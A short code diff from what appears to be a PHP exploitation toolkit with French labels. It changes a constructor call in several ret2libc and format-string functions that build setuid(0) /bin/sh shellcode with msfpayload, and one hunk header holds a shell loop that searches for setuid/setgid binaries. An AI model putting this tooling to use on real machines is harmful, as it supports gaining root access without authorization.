@@ -614,7 +614,7 @@ function ret2lib4linux_setuid_printf_fmt8($offset) {
 	$addr_fm_str_6 = $this->elf2addr4env("FMT6");
 	
 	$shellcode_hex = $this->file_msf2root("/bin/sh");
-	$file_bin = new bin4linux($shellcode_hex);
+	$file_bin = new bin4linux("",$shellcode_hex);
 	$file_bin->file_shellcode2graph();
 	$this->pause();
 	$file_bin->file_h2hex();
@@ -863,7 +863,7 @@ for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f
 	$this->titre("Creation d'un shellcode wrapper setuid(0) avec msfpayload");
 	$this->ssTitre("SHELLCODE ELF");
 	$shellcode_hex = $this->file_msf2root("/bin/sh");
-	$file_bin = new bin4linux($shellcode_hex);
+	$file_bin = new bin4linux("",$shellcode_hex);
 	$file_bin->file_shellcode2graph();
 	$this->pause();
 	$file_bin->file_h2hex();
@@ -915,7 +915,7 @@ public function ret2lib4linux_setuid_printf_fmt3_execl($offset){ // enlever plus
 	$this->titre("Creation d'un shellcode wrapper setuid(0) avec msfpayload");
 	$this->ssTitre("SHELLCODE ELF");
 	$shellcode_hex = $this->file_msf2root("/bin/sh");
-	$file_bin = new bin4linux($shellcode_hex);
+	$file_bin = new bin4linux("",$shellcode_hex);
 	$file_bin->file_shellcode2graph();
 	$this->pause();
 	$file_bin->file_h2hex();
